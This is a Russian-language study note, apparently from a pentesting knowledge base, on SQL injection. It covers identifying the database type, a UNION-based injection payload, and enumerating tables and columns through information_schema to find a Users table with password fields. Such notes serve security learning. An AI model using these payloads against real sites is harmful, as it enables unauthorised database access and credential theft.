[[0Определение SQL Injection]] - карта раздела
## Оглавление
[[#Быстрое определение]]
[[#Пример атаки через union]] ([[SQL injection UNION attacks]] - пример таких атак) 
[[#Перечисление таблиц в БД]]


> [!info] Общая информация 
> Когда мы потенциально нашли SQL инъекцию необходимо определить тип БД с которой мы работаем, для этого есть специальные команды
### Быстрое определение

Для начала только необходимо определить можно вытащить хоть какие то данные, чтобы запрос прошел корректно

|      Тип БД      |          Запрос           |
| :--------------: | :-----------------------: |
| Microsoft, MySQL |    `SELECT @@version`     |
|      Oracle      | `SELECT * FROM v$version` |
|    PostgreSQL    |    `SELECT version()`     |

---
### Пример атаки через union
```sql
' UNION SELECT @@version
```

> [!danger] ВАЖНО
> Если просто вставить пейлоад работать не будет его нужно приспособить для каждого запроса

---
### Перечисление таблиц в БД
Большинство баз данных(Кроме Oracle) имеет специальную таблицу, которая называется информационной схемой, там содержится основная информация о БД
Например мы может использовать `information_schema.tables`, пример запроса
```sql
SELECT * FROM information_schema.tables
```
Вывод будет примерно таким
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE --парметры для SELECT *
=====================================================
MyDatabase       dbo        Users      BASE TABLE
MyDatabase       dbo        Feedback   BASE TABLE
MyDatabase       dbo        Products   BASE TABLE
```
Здесь мы можем увидеть что у нас есть три таблицы `Products`, `Users`, `Feedback`
Мы так же можем посмотреть колонки для определенной таблицы с помощью `information_schema.columns` 
В этом примере получаем колонки из таблицы `Users`
```sql
SELECT * FROM information_schema.columns WHERE table_name='Users'
```
Вывод будет примерно таким
``` 
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
=================================================================
MyDatabase      dbo         Users      UserId       int
MyDatabase      dbo         Users      Username     varchar
MyDatabase      dbo         Users      Password     varchar
```
